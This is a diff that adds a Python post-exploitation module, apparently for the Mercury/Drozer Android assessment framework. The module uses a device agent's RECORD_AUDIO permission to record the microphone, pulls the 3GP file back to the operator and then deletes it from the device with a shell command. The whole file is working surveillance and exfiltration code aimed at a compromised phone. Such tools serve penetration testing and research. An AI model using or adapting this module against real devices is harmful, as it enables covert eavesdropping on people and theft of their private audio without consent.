@@ -1,0 +1,71 @@
+from mwr.droidhg.modules import common, Module
+
+class Microphone(Module, common.ClassLoader, common.FileSystem, common.Shell):
+
+    name = "Record sound from the microphone"
+    description = "Record sound from the microphone and store it in a 3GP sound file. Relies on the agent having the RECORD_AUDIO permission."
+    examples = """
+mercury> run post.capture.microphone /home/user/Desktop/test.3gp
+[*] Performing crazy reflection gymnastics
+[*] Preparing recorder attributes
+[+] Recording started
+[+] Press [Enter] to stop recording
+[+] Stopped...downloading recording
+[+] Done.
+"""
+    author = "Tyrone (@mwrlabs)"
+    date = "2013-04-22"
+    license = "MWR Code License"
+    path = ["post", "capture"]
+    
+    def add_arguments(self, parser):
+        parser.add_argument("destination", help="destination to save recording (.3gp extension)")
+
+    def execute(self, arguments):
+        
+        # Check that the agent has the RECORD_AUDIO permission
+        packageManager = self.getContext().getPackageManager()
+        if not packageManager.checkPermission("android.permission.RECORD_AUDIO", self.getContext().getPackageName()) == packageManager.PERMISSION_GRANTED:
+            self.stdout.write("[-] This agent does not have the RECORD_AUDIO permission. Exiting...\n")
+            return
+        
+        # Check that destination ends in 3gp
+        if not arguments.destination.upper().endswith(".3GP"):
+            self.stdout.write("[-] Destination file must have a .3gp extension. Exiting...\n")
+            return
+
+        self.stdout.write("[*] Performing crazy reflection gymnastics\n")
+        recorder = self.new("android.media.MediaRecorder")
+        AudioSource = self.klass("android.media.MediaRecorder$AudioSource")
+        OutputFormat = self.klass("android.media.MediaRecorder$OutputFormat")
+        AudioEncoder = self.klass("android.media.MediaRecorder$AudioEncoder")
+        
+        self.stdout.write("[*] Preparing recorder attributes\n")
+        recorder.setAudioSource(AudioSource.MIC)
+        recorder.setOutputFormat(OutputFormat.THREE_GPP)
+        recorder.setAudioEncoder(AudioEncoder.AMR_NB)
+        recorder.setOutputFile("/data/data/com.mwr.droidhg.agent/files/recording.3gp")
+        recorder.prepare()
+        
+        self.stdout.write("[+] Recording started\n")
+        recorder.start()
+        raw_input("[+] Press [Enter] to stop recording")
+        recorder.stop()
+        self.stdout.write("[+] Stopped...downloading recording\n")
+        recorder.reset()
+        recorder.release()
+        
+        # Download
+        length = self.downloadFile("/data/data/com.mwr.droidhg.agent/files/recording.3gp", arguments.destination)
+        
+        if length != None:
+            self.stdout.write("[+] Done.\n")
+            
+            # Remove recording from device
+            self.shellExec("rm /data/data/com.mwr.droidhg.agent/files/recording.3gp")
+        else:
+            self.stderr.write("[-] Recording download failed.\n")
+            
+    def get_completion_suggestions(self, action, text, **kwargs):
+        if action.dest == "destination":
+            return common.path_completion.on_console(text)
